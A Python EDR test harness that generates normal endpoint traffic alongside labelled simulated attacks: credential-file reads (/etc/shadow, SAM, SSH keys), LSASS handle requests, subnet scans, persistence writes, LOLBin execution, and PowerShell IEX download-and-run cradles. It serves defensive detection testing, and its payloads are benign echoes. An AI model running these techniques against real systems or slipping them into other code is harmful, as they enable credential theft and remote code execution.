"""
traffic_generator.py — Endpoint traffic simulator for SentinelOne / CrowdStrike testing.

Generates two categories of activity:
  NORMAL        — realistic background traffic (web browsing, DNS, file I/O, SMTP)
  [TEST-ATTACK] — clearly labeled simulated attack behaviors for detection validation

OS-aware: detects Windows / RHEL/CentOS / Debian/Kali / macOS at startup and
runs only the attacks and recon commands relevant to that platform.

Run with --help for all options.
"""

from __future__ import annotations

import argparse
import base64
import datetime
import hashlib
import logging
import os
import platform
import random
import smtplib
import socket
import subprocess
import tempfile
import threading
import time
import urllib.request

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

LOG_FMT = "%(asctime)s  %(levelname)-8s  %(message)s"
logging.basicConfig(format=LOG_FMT, datefmt="%Y-%m-%d %H:%M:%S", level=logging.INFO)
log = logging.getLogger("traffic-gen")

# ---------------------------------------------------------------------------
# OS detection
# ---------------------------------------------------------------------------

def detect_os() -> str:
    """Return one of: windows | rhel | debian | macos | linux"""
    system = platform.system()
    if system == "Windows":
        return "windows"
    if system == "Darwin":
        return "macos"
    if system == "Linux":
        try:
            with open("/etc/os-release") as f:
                text = f.read().lower()
            if any(x in text for x in ("centos", "rhel", "fedora", "rocky", "almalinux")):
                return "rhel"
            if any(x in text for x in ("kali", "debian", "ubuntu", "mint", "parrot")):
                return "debian"
        except OSError:
            pass
        return "linux"
    return "linux"


OS = detect_os()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

BENIGN_URLS = [
    "https://www.wikipedia.org",
    "https://www.bbc.com",
    "https://www.weather.gov",
    "https://www.python.org",
    "https://www.nist.gov",
    "https://www.cnn.com",
    "https://www.github.com",
    "https://www.stackoverflow.com",
    "https://news.ycombinator.com",
    "https://www.reuters.com",
]

DNS_TARGETS = [
    "www.google.com",
    "mail.google.com",
    "smtp.office365.com",
    "imap.gmail.com",
    "windowsupdate.microsoft.com",
    "api.github.com",
    "pypi.org",
]

SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 587

EICAR_STRING = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# RFC 5737 reserved documentation addresses — never routed, safe for external
# connection simulation. Generates outbound telemetry without reaching anything real.
EXTERNAL_C2_TARGETS = [
    ("192.0.2.100",    4444),
    ("198.51.100.50",  8080),
    ("203.0.113.200",  1337),
    ("192.0.2.200",   31337),
    ("198.51.100.100", 6666),
    ("203.0.113.100",   443),
    ("192.0.2.150",      53),
]

# Well-documented sinkholed C2 domains (safe to query; resolve to sinkhole IPs)
C2_DOMAINS = [
    "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",  # WannaCry kill switch
    "avsvmcloud.com",                                   # SolarWinds Sunburst C2
]

# Per-OS EICAR drop locations
_EICAR_LOCATIONS = {
    "windows": [
        tempfile.gettempdir(),
        os.path.expanduser(r"~\AppData\Local\Temp"),
        os.path.expanduser(r"~\AppData\Roaming"),
        r"C:\Windows\Temp",
    ],
    "linux": ["/tmp", "/var/tmp", os.path.expanduser("~")],
}
_EICAR_LOCATIONS["rhel"]   = _EICAR_LOCATIONS["linux"]
_EICAR_LOCATIONS["debian"] = _EICAR_LOCATIONS["linux"]
_EICAR_LOCATIONS["macos"]  = ["/tmp", os.path.expanduser("~"), os.path.expanduser("~/Downloads")]

# ---------------------------------------------------------------------------
# Per-OS recon command tables
# ---------------------------------------------------------------------------

_RECON = {
    "windows": [
        ["whoami"],
        ["whoami", "/all"],
        ["ipconfig", "/all"],
        ["net", "user"],
        ["net", "localgroup", "administrators"],
        ["net", "share"],
        ["netstat", "-an"],
        ["tasklist"],
        ["systeminfo"],
        ["reg", "query", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"],
        ["reg", "query", r"HKCU\Software\Microsoft\Internet Explorer\Main"],
        ["wmic", "process", "list", "brief"],
        ["wmic", "useraccount", "list"],
        ["dir", r"C:\Users"],
        ["schtasks", "/query"],
        ["arp", "-a"],
        ["route", "print"],
    ],
    "rhel": [
        ["whoami"], ["id"], ["uname", "-a"], ["ip", "addr"], ["ip", "route"],
        ["ss", "-tulnp"], ["ps", "aux"], ["cat", "/etc/passwd"], ["cat", "/etc/hosts"],
        ["ls", "/home"], ["env"], ["crontab", "-l"], ["arp", "-n"],
        ["rpm", "-qa"], ["systemctl", "list-units", "--type=service", "--state=running"],
        ["last"], ["w"], ["find", "/etc/cron.d", "-type", "f"],
    ],
    "debian": [
        ["whoami"], ["id"], ["uname", "-a"], ["ip", "addr"], ["ip", "route"],
        ["ss", "-tulnp"], ["ps", "aux"], ["cat", "/etc/passwd"], ["cat", "/etc/hosts"],
        ["ls", "/home"], ["env"], ["crontab", "-l"], ["arp", "-n"],
        ["dpkg", "-l"], ["systemctl", "list-units", "--type=service", "--state=running"],
        ["last"], ["w"], ["find", "/etc/cron.d", "-type", "f"],
    ],
    "macos": [
        ["whoami"], ["id"], ["uname", "-a"], ["ifconfig"], ["netstat", "-an"],
        ["ps", "aux"], ["ls", "/Users"], ["env"], ["crontab", "-l"], ["arp", "-an"],
        ["launchctl", "list"], ["sw_vers"], ["last"], ["w"], ["dscl", ".", "-list", "/Users"],
    ],
    "linux": [
        ["whoami"], ["id"], ["uname", "-a"], ["ip", "addr"], ["ss", "-tulnp"],
        ["ps", "aux"], ["cat", "/etc/passwd"], ["cat", "/etc/hosts"], ["ls", "/home"],
        ["env"], ["crontab", "-l"],
    ],
}

# ---------------------------------------------------------------------------
# Per-OS credential file targets
# ---------------------------------------------------------------------------

_CRED_TARGETS = {
    "windows": [
        r"C:\Windows\System32\config\SAM",
        r"C:\Windows\System32\config\SYSTEM",
        r"C:\Windows\System32\config\SECURITY",
        r"C:\Windows\NTDS\NTDS.dit",
        r"C:\Users\Default\NTUSER.DAT",
        os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles"),
        os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        os.path.expanduser(r"~\AppData\Local\Microsoft\Credentials"),
    ],
    "rhel": [
        "/etc/shadow", "/etc/sudoers", "/var/log/secure",
        os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.bash_history"),
        "/root/.bash_history", "/root/.ssh/authorized_keys",
    ],
    "debian": [
        "/etc/shadow", "/etc/sudoers", "/var/log/auth.log",
        os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.bash_history"),
        "/root/.bash_history", "/root/.ssh/authorized_keys",
    ],
    "macos": [
        "/etc/master.passwd", "/etc/sudoers",
        os.path.expanduser("~/Library/Keychains"),
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.bash_history"), os.path.expanduser("~/.zsh_history"),
        "/var/log/system.log",
    ],
    "linux": [
        "/etc/shadow", "/etc/sudoers",
        os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.bash_history"),
        "/root/.bash_history",
    ],
}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _tag(label: str) -> str:
    return f"[{label}]"


def run_cmd(args: list[str], timeout: int = 10) -> tuple[int, str]:
    try:
        result = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        snippet = (result.stdout or "").strip()[:200]
        return result.returncode, snippet
    except FileNotFoundError:
        return -1, f"command not found: {args[0]}"
    except subprocess.TimeoutExpired:
        return -1, "timeout"
    except Exception as exc:
        return -1, str(exc)


def _which(cmd: str) -> bool:
    rc, _ = run_cmd(["which", cmd] if OS != "windows" else ["where", cmd], timeout=5)
    return rc == 0


def get_local_subnet() -> str:
    """Return the /24 prefix of the primary interface (e.g. '192.168.1')."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ".".join(ip.split(".")[:3])
    except Exception:
        return "192.168.1"


def _dga_domain() -> str:
    """Generate a single DGA-pattern domain using today's date as part of the seed."""
    seed = f"{random.randint(0, 0xFFFF):04x}{datetime.date.today()}"
    h = hashlib.md5(seed.encode()).hexdigest()
    length = random.randint(10, 18)
    tld = random.choice([".com", ".net", ".org", ".biz", ".info", ".top"])
    return h[:length] + tld

# ---------------------------------------------------------------------------
# Normal traffic — cross-platform
# ---------------------------------------------------------------------------

def normal_web_browse():
    url = random.choice(BENIGN_URLS)
    log.info("%s Web browse → %s", _tag("NORMAL"), url)
    try:
        req = urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0 (compatible; EndpointSim/1.0)"}
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            size = len(resp.read(65536))
        log.info("%s  ← %d bytes", _tag("NORMAL"), size)
    except Exception as exc:
        log.debug("%s  browse error: %s", _tag("NORMAL"), exc)


def normal_dns_lookup():
    host = random.choice(DNS_TARGETS)
    log.info("%s DNS lookup → %s", _tag("NORMAL"), host)
    try:
        ip = socket.gethostbyname(host)
        log.info("%s  ← %s", _tag("NORMAL"), ip)
    except Exception as exc:
        log.debug("%s  DNS error: %s", _tag("NORMAL"), exc)


def normal_file_operations():
    tmpdir = tempfile.gettempdir()
    fname = os.path.join(tmpdir, f"sim_doc_{random.randint(1000, 9999)}.txt")
    content = f"Meeting notes {datetime.datetime.now()}\n" + "Lorem ipsum " * 20
    log.info("%s File I/O → write %s", _tag("NORMAL"), fname)
    try:
        with open(fname, "w") as f:
            f.write(content)
        with open(fname, "r") as f:
            _ = f.read()
        os.remove(fname)
    except Exception as exc:
        log.debug("%s  file I/O error: %s", _tag("NORMAL"), exc)


def normal_smtp_probe():
    log.info("%s SMTP probe → %s:%d", _tag("NORMAL"), SMTP_HOST, SMTP_PORT)
    try:
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=8) as s:
            banner = s.ehlo()[1].decode(errors="replace")[:80]
        log.info("%s  ← EHLO OK: %s", _tag("NORMAL"), banner)
    except Exception as exc:
        log.debug("%s  SMTP error: %s", _tag("NORMAL"), exc)


def normal_local_info():
    cmds = {
        "windows": [["hostname"], ["ver"]],
        "rhel":    [["hostname"], ["uname", "-r"], ["hostnamectl"]],
        "debian":  [["hostname"], ["uname", "-r"], ["hostnamectl"]],
        "macos":   [["hostname"], ["sw_vers"]],
        "linux":   [["hostname"], ["uname", "-r"]],
    }
    cmd = random.choice(cmds.get(OS, [["hostname"]]))
    log.info("%s Local info → %s", _tag("NORMAL"), " ".join(cmd))
    _, out = run_cmd(cmd)
    log.info("%s  ← %s", _tag("NORMAL"), out[:100] if out else "(empty)")


NORMAL_ACTIONS = [
    (normal_web_browse,      4),
    (normal_dns_lookup,      3),
    (normal_file_operations, 3),
    (normal_smtp_probe,      1),
    (normal_local_info,      2),
]


def pick_normal() -> callable:
    population, weights = zip(*NORMAL_ACTIONS)
    return random.choices(population, weights=weights, k=1)[0]

# ---------------------------------------------------------------------------
# Attack simulations — common to all platforms
# ---------------------------------------------------------------------------

def attack_eicar_drop():
    """Single EICAR drop — quick file detection test."""
    fname = os.path.join(tempfile.gettempdir(), "EICAR_TEST.com")
    log.warning("%s EICAR drop → %s", _tag("TEST-ATTACK"), fname)
    try:
        with open(fname, "w") as f:
            f.write(EICAR_STRING)
        log.warning("%s  written — expecting AV/EDR alert", _tag("TEST-ATTACK"))
        time.sleep(2)
        os.remove(fname)
        log.warning("%s  removed", _tag("TEST-ATTACK"))
    except Exception as exc:
        log.debug("%s  EICAR error: %s", _tag("TEST-ATTACK"), exc)


def attack_eicar_multi_drop():
    """Drop EICAR in multiple locations simultaneously — harder to miss."""
    locations = _EICAR_LOCATIONS.get(OS, _EICAR_LOCATIONS["linux"])
    written = []
    log.warning("%s EICAR multi-drop — %d locations", _tag("TEST-ATTACK"), len(locations))
    for loc in locations:
        fname = os.path.join(loc, "EICAR_TEST.com")
        try:
            with open(fname, "w") as f:
                f.write(EICAR_STRING)
            written.append(fname)
            log.warning("%s  written: %s", _tag("TEST-ATTACK"), fname)
        except Exception as exc:
            log.debug("%s  failed %s: %s", _tag("TEST-ATTACK"), fname, exc)
    time.sleep(3)
    for fname in written:
        try:
            os.remove(fname)
        except OSError:
            pass
    log.warning("%s  %d EICAR files removed", _tag("TEST-ATTACK"), len(written))


def attack_recon_commands():
    """Recon burst — individual commands called directly (quiet process tree)."""
    cmds = _RECON.get(OS, _RECON["linux"])
    burst = random.randint(2, 4)
    log.warning("%s Recon burst (%d commands)", _tag("TEST-ATTACK"), burst)
    for _ in range(burst):
        cmd = random.choice(cmds)
        log.warning("%s  exec: %s", _tag("TEST-ATTACK"), " ".join(cmd))
        rc, out = run_cmd(cmd)
        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80] if out else "(empty)")
        time.sleep(random.uniform(0.3, 1.0))


def attack_credential_file_access():
    """Stat credential file paths — low-noise existence check."""
    targets = _CRED_TARGETS.get(OS, _CRED_TARGETS["linux"])
    sample = random.sample(targets, min(3, len(targets)))
    log.warning("%s Credential file stat — harvesting simulation", _tag("TEST-ATTACK"))
    for path in sample:
        log.warning("%s  stat: %s", _tag("TEST-ATTACK"), path)
        try:
            log.warning("%s    → %s", _tag("TEST-ATTACK"),
                        "EXISTS" if os.path.exists(path) else "not found")
        except Exception as exc:
            log.warning("%s    → error: %s", _tag("TEST-ATTACK"), exc)


def attack_credential_read():
    """Actually open credential files — generates file-read telemetry EDRs track."""
    targets = _CRED_TARGETS.get(OS, _CRED_TARGETS["linux"])
    sample = random.sample(targets, min(3, len(targets)))
    log.warning("%s Credential file READ attempt — open() syscall harvesting", _tag("TEST-ATTACK"))
    for path in sample:
        log.warning("%s  open: %s", _tag("TEST-ATTACK"), path)
        try:
            with open(path, "rb") as f:
                data = f.read(512)
            log.warning("%s    → READ %d bytes (check permissions!)", _tag("TEST-ATTACK"), len(data))
        except PermissionError:
            log.warning("%s    → DENIED (expected — open attempt logged by EDR)", _tag("TEST-ATTACK"))
        except FileNotFoundError:
            log.warning("%s    → not found", _tag("TEST-ATTACK"))
        except Exception as exc:
            log.warning("%s    → %s", _tag("TEST-ATTACK"), exc)


def attack_port_scan_localhost():
    """Port sweep of localhost — low signal but establishes baseline."""
    ports = random.sample(range(1, 1025), 20)
    log.warning("%s Port scan — localhost ports %s", _tag("TEST-ATTACK"), sorted(ports))
    open_ports = []
    for port in sorted(ports):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.15)
        if s.connect_ex(("127.0.0.1", port)) == 0:
            open_ports.append(port)
        s.close()
    log.warning("%s  open: %s", _tag("TEST-ATTACK"), open_ports or "none")


def attack_subnet_scan():
    """Scan neighbouring hosts on the local subnet — simulates lateral movement recon."""
    subnet = get_local_subnet()
    lateral_ports = [22, 135, 139, 445, 3389, 5985, 5986]
    hosts = [f"{subnet}.{i}" for i in random.sample(range(1, 50), 10)]
    log.warning("%s Subnet scan — %s.0/24 on ports %s", _tag("TEST-ATTACK"), subnet, lateral_ports)
    hits = []
    for host in hosts:
        for port in random.sample(lateral_ports, 3):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((host, port)) == 0:
                hits.append(f"{host}:{port}")
                log.warning("%s  OPEN %s:%d", _tag("TEST-ATTACK"), host, port)
            s.close()
    log.warning("%s  scan complete — %d open found", _tag("TEST-ATTACK"), len(hits))


def attack_external_c2_connect():
    """Connect to RFC 5737 reserved IPs on C2 ports — generates real outbound telemetry."""
    targets = random.sample(EXTERNAL_C2_TARGETS, 3)
    log.warning("%s External C2 connection attempts (RFC 5737 test IPs)", _tag("TEST-ATTACK"))
    for host, port in targets:
        log.warning("%s  connect → %s:%d", _tag("TEST-ATTACK"), host, port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        rc = s.connect_ex((host, port))
        s.close()
        log.warning("%s    → %s", _tag("TEST-ATTACK"),
                    "open" if rc == 0 else f"no route/refused (rc={rc})")


def attack_dns_c2_domains():
    """DNS lookups for known sinkholed C2 domains — triggers domain reputation checks."""
    log.warning("%s DNS C2 domain lookups — known sinkholed malware infrastructure",
                _tag("TEST-ATTACK"))
    for domain in C2_DOMAINS:
        log.warning("%s  resolve: %s", _tag("TEST-ATTACK"), domain)
        try:
            ip = socket.gethostbyname(domain)
            log.warning("%s    → %s (sinkhole)", _tag("TEST-ATTACK"), ip)
        except socket.gaierror as exc:
            log.warning("%s    → failed: %s", _tag("TEST-ATTACK"), exc)


def attack_dga_dns():
    """Query DGA-pattern domains — rapid NXDOMAIN burst triggers DGA detection rules."""
    count = random.randint(5, 10)
    domains = [_dga_domain() for _ in range(count)]
    log.warning("%s DGA-pattern DNS burst — %d algorithmically generated domains",
                _tag("TEST-ATTACK"), count)
    for domain in domains:
        log.warning("%s  resolve: %s", _tag("TEST-ATTACK"), domain)
        try:
            ip = socket.gethostbyname(domain)
            log.warning("%s    → %s", _tag("TEST-ATTACK"), ip)
        except socket.gaierror:
            log.warning("%s    → NXDOMAIN (expected)", _tag("TEST-ATTACK"))


def attack_script_in_temp():
    """Write and execute a script from the temp directory."""
    tmpdir = tempfile.gettempdir()
    if OS == "windows":
        fname = os.path.join(tmpdir, "test_payload.bat")
        content = '@echo [TEST-ATTACK] Script-in-temp execution\r\n@echo SentinelOne simulation\r\n'
        runner = ["cmd.exe", "/c", fname]
    else:
        fname = os.path.join(tmpdir, "test_payload.sh")
        content = '#!/bin/sh\necho "[TEST-ATTACK] Script-in-temp execution"\necho "SentinelOne simulation"\n'
        runner = ["sh", fname]
    log.warning("%s Script-in-temp — write+exec %s", _tag("TEST-ATTACK"), fname)
    try:
        with open(fname, "w") as f:
            f.write(content)
        if OS != "windows":
            os.chmod(fname, 0o755)
        rc, out = run_cmd(runner, timeout=10)
        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out)
        os.remove(fname)
    except Exception as exc:
        log.debug("%s  error: %s", _tag("TEST-ATTACK"), exc)

# ---------------------------------------------------------------------------
# Attack simulations — Windows
# ---------------------------------------------------------------------------

def attack_cmd_chain():
    """Full recon chain via cmd.exe — creates suspicious python→cmd→tools process tree."""
    cmds = (
        "whoami /all && net user && net localgroup administrators && "
        "ipconfig /all && systeminfo && tasklist /v && "
        "netstat -an && reg query HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers"
    )
    log.warning("%s CMD recon chain — 8 commands via cmd.exe intermediary", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["cmd.exe", "/c", cmds], timeout=30)
    log.warning("%s  rc=%d  %d output lines", _tag("TEST-ATTACK"), rc, len(out.splitlines()))


def attack_powershell_encoded():
    payload = '[System.Console]::WriteLine("[TEST-ATTACK] SentinelOne encoded PS test")'
    encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
    log.warning("%s PowerShell encoded command — base64 payload exec", _tag("TEST-ATTACK"))
    rc, out = run_cmd(
        ["powershell.exe", "-NoProfile", "-EncodedCommand", encoded], timeout=15
    )
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])


def attack_powershell_download_cradle():
    url = "https://httpbin.org/get"
    script = (
        f'(New-Object Net.WebClient).DownloadString("{url}") | Out-Null; '
        'Write-Output "[TEST-ATTACK] cradle complete"'
    )
    log.warning("%s PowerShell download cradle → %s", _tag("TEST-ATTACK"), url)
    rc, out = run_cmd(
        ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script], timeout=20
    )
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])


def attack_lolbas_certutil():
    url = "https://httpbin.org/get"
    outfile = os.path.join(tempfile.gettempdir(), "test_certutil.tmp")
    log.warning("%s LOLBAS certutil download → %s", _tag("TEST-ATTACK"), url)
    rc, out = run_cmd(["certutil", "-urlcache", "-split", "-f", url, outfile], timeout=20)
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])
    try:
        os.remove(outfile)
    except OSError:
        pass


def attack_lolbas_mshta():
    """mshta executing inline VBScript — common macro-less execution technique."""
    script = (
        'vbscript:Execute("CreateObject(""Wscript.Shell"").'
        'Run ""cmd /c echo [TEST-ATTACK] mshta execution"",0:close")'
    )
    log.warning("%s LOLBAS mshta — inline VBScript execution", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["mshta.exe", script], timeout=15)
    log.warning("%s  rc=%d", _tag("TEST-ATTACK"), rc)


def attack_lolbas_wscript():
    """Write a VBScript to temp and execute via wscript.exe."""
    fname = os.path.join(tempfile.gettempdir(), "test_payload.vbs")
    content = 'WScript.Echo "[TEST-ATTACK] wscript execution from temp"\n'
    log.warning("%s LOLBAS wscript — VBScript from temp", _tag("TEST-ATTACK"))
    try:
        with open(fname, "w") as f:
            f.write(content)
        rc, out = run_cmd(["wscript.exe", "/nologo", fname], timeout=15)
        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80])
        os.remove(fname)
    except Exception as exc:
        log.debug("%s  error: %s", _tag("TEST-ATTACK"), exc)


def attack_lolbas_rundll32():
    """rundll32 JavaScript execution — Squiblydoo-style LOLBin."""
    script = (
        r'javascript:"\..\mshtml,RunHTMLApplication ";'
        r'document.write();'
        r'new%20ActiveXObject("WScript.Shell")'
        r'.Run("cmd /c echo [TEST-ATTACK] rundll32",0,True);'
    )
    log.warning("%s LOLBAS rundll32 — JavaScript execution", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["rundll32.exe", script], timeout=15)
    log.warning("%s  rc=%d", _tag("TEST-ATTACK"), rc)


def attack_windows_registry_enum():
    keys = [
        r"HKLM\SYSTEM\CurrentControlSet\Services",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        r"HKCU\Software\SimonTatham\PuTTY\Sessions",
        r"HKLM\SOFTWARE\OpenSSH",
        r"HKCU\Software\Microsoft\Terminal Server Client\Servers",
    ]
    log.warning("%s Registry enumeration — credential/config keys", _tag("TEST-ATTACK"))
    for key in random.sample(keys, 2):
        log.warning("%s  reg query: %s", _tag("TEST-ATTACK"), key)
        rc, out = run_cmd(["reg", "query", key], timeout=8)
        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80] if out else "(empty)")


def attack_registry_persistence():
    """Write a Run key then immediately delete it — persistence attempt with cleanup."""
    key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    name = "SentinelOneTest"
    value = r"C:\Windows\System32\cmd.exe /c echo [TEST-ATTACK]"
    log.warning("%s Registry persistence — write HKCU Run key", _tag("TEST-ATTACK"))
    rc, _ = run_cmd(["reg", "add", f"HKCU\\{key}", "/v", name, "/d", value, "/f"])
    log.warning("%s  write rc=%d", _tag("TEST-ATTACK"), rc)
    time.sleep(2)
    rc, _ = run_cmd(["reg", "delete", f"HKCU\\{key}", "/v", name, "/f"])
    log.warning("%s  cleanup rc=%d", _tag("TEST-ATTACK"), rc)


def attack_scheduled_task():
    """Create a scheduled task then delete it — persistence attempt with cleanup."""
    name = "SentinelOneTestTask"
    log.warning("%s Scheduled task persistence — create/delete", _tag("TEST-ATTACK"))
    rc, _ = run_cmd([
        "schtasks", "/create", "/tn", name,
        "/tr", "cmd.exe /c echo [TEST-ATTACK]",
        "/sc", "once", "/st", "23:59", "/f",
    ])
    log.warning("%s  create rc=%d", _tag("TEST-ATTACK"), rc)
    time.sleep(2)
    rc, _ = run_cmd(["schtasks", "/delete", "/tn", name, "/f"])
    log.warning("%s  cleanup rc=%d", _tag("TEST-ATTACK"), rc)


def attack_vss_recon():
    """Shadow copy and backup enumeration — ransomware pre-stage recon pattern."""
    cmds = [
        ["vssadmin", "list", "shadows"],
        ["wmic", "shadowcopy", "list", "brief"],
        ["wbadmin", "get", "status"],
        ["bcdedit", "/enum", "all"],
    ]
    log.warning("%s VSS/backup recon — ransomware pre-stage pattern", _tag("TEST-ATTACK"))
    for cmd in cmds:
        log.warning("%s  exec: %s", _tag("TEST-ATTACK"), " ".join(cmd))
        rc, out = run_cmd(cmd, timeout=15)
        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:60] if out else "(empty)")
        time.sleep(0.5)


def attack_lsass_access():
    """Attempt to open a handle to LSASS — credential dumping precursor."""
    import ctypes
    rc, out = run_cmd(
        ["tasklist", "/fi", "imagename eq lsass.exe", "/fo", "csv", "/nh"], timeout=10
    )
    try:
        # CSV output: "lsass.exe","1234","Services","0","6,456 K"
        pid = int(out.split(",")[1].strip('"'))
    except (IndexError, ValueError):
        log.warning("%s  could not resolve LSASS PID", _tag("TEST-ATTACK"))
        return
    log.warning("%s LSASS handle request — PID %d", _tag("TEST-ATTACK"), pid)
    PROCESS_ALL_ACCESS = 0x1F0FFF
    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if handle:
        log.warning("%s  handle obtained — LSASS accessible (check agent config!)",
                    _tag("TEST-ATTACK"))
        ctypes.windll.kernel32.CloseHandle(handle)
    else:
        err = ctypes.windll.kernel32.GetLastError()
        log.warning("%s  access denied — GetLastError=%d (expected on hardened systems)",
                    _tag("TEST-ATTACK"), err)


def attack_powershell_iex():
    """IEX (Invoke-Expression) — most-signatured PowerShell download+exec technique."""
    url = "https://httpbin.org/get"
    log.warning("%s PowerShell IEX download+exec — %s", _tag("TEST-ATTACK"), url)
    rc, out = run_cmd(
        [
            "powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
            f"IEX (New-Object Net.WebClient).DownloadString('{url}')",
        ],
        timeout=20,
    )
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])

# ---------------------------------------------------------------------------
# Attack simulations — Linux (all flavors)
# ---------------------------------------------------------------------------

def attack_bash_chain():
    """Full recon chain via bash -c — creates suspicious python→bash→tools process tree."""
    chain = (
        "whoami; id; hostname; uname -a; "
        "cat /etc/passwd | head -10; ls -la /home; "
        "ps aux | head -20; ss -tulnp; env | grep -i path"
    )
    log.warning("%s Bash recon chain — multi-command via bash intermediary", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["bash", "-c", chain], timeout=20)
    log.warning("%s  rc=%d  %d output lines", _tag("TEST-ATTACK"), rc, len(out.splitlines()))


def attack_bash_encoded():
    payload = 'echo "[TEST-ATTACK] SentinelOne bash encoded command test"'
    encoded = base64.b64encode(payload.encode()).decode()
    log.warning("%s Bash encoded command — base64 decode+exec", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["bash", "-c", f"echo {encoded} | base64 -d | bash"], timeout=10)
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])


def attack_curl_download_cradle():
    url = "https://httpbin.org/get"
    tool = "curl" if _which("curl") else "wget"
    log.warning("%s %s download cradle → %s", _tag("TEST-ATTACK"), tool, url)
    if tool == "curl":
        rc, out = run_cmd(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", url], timeout=15)
    else:
        rc, out = run_cmd(["wget", "-q", "-O", "/dev/null", url], timeout=15)
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80])


def attack_shadow_read():
    """Actually attempt to open /etc/shadow — generates a file-read syscall EDRs log."""
    log.warning("%s /etc/shadow read attempt — credential access simulation", _tag("TEST-ATTACK"))
    try:
        with open("/etc/shadow", "r") as f:
            lines = f.readlines()
        log.warning("%s  READ SUCCESSFUL — %d entries (check permissions!)",
                    _tag("TEST-ATTACK"), len(lines))
    except PermissionError:
        log.warning("%s  DENIED (expected — open() attempt logged by EDR)", _tag("TEST-ATTACK"))
    except FileNotFoundError:
        log.warning("%s  /etc/shadow not found on this system", _tag("TEST-ATTACK"))


def attack_suid_search():
    log.warning("%s SUID binary search — privilege escalation recon", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["find", "/usr", "-perm", "-4000", "-type", "f"], timeout=15)
    log.warning("%s  rc=%d  found %d entries", _tag("TEST-ATTACK"), rc,
                len(out.splitlines()) if out else 0)


def attack_cron_persistence_attempt():
    log.warning("%s Cron persistence attempt — write+remove test entry", _tag("TEST-ATTACK"))
    marker = "# [TEST-ATTACK] SentinelOne persistence simulation"
    rc, _ = run_cmd(
        ["bash", "-c", f'(crontab -l 2>/dev/null; echo "{marker}") | crontab -'], timeout=10
    )
    log.warning("%s  rc=%d  %s", _tag("TEST-ATTACK"), rc,
                "entry written" if rc == 0 else "blocked/failed")
    if rc == 0:
        run_cmd(["bash", "-c", f"crontab -l | grep -v '{marker}' | crontab -"], timeout=10)
        log.warning("%s  test entry removed", _tag("TEST-ATTACK"))


def attack_ptrace_attempt():
    """Attempt ptrace ATTACH on PID 1 (init/systemd) — process injection precursor."""
    import ctypes
    import ctypes.util
    log.warning("%s ptrace ATTACH → PID 1 (init/systemd)", _tag("TEST-ATTACK"))
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        PTRACE_ATTACH = 16
        result = libc.ptrace(PTRACE_ATTACH, 1, 0, 0)
        if result == 0:
            log.warning("%s  ptrace succeeded (unexpected) — detaching", _tag("TEST-ATTACK"))
            PTRACE_DETACH = 17
            libc.ptrace(PTRACE_DETACH, 1, 0, 0)
        else:
            err = ctypes.get_errno()
            log.warning("%s  DENIED — errno=%d (%s)", _tag("TEST-ATTACK"), err, os.strerror(err))
    except Exception as exc:
        log.debug("%s  ptrace error: %s", _tag("TEST-ATTACK"), exc)


def attack_sensitive_dir_traversal():
    dirs = ["/etc", "/var/log", "/root", os.path.expanduser("~/.ssh"), "/tmp"]
    target = random.choice(dirs)
    log.warning("%s Directory traversal → %s", _tag("TEST-ATTACK"), target)
    rc, out = run_cmd(["ls", "-la", target], timeout=8)
    log.warning("%s  rc=%d  %d entries", _tag("TEST-ATTACK"), rc,
                len(out.splitlines()) if out else 0)


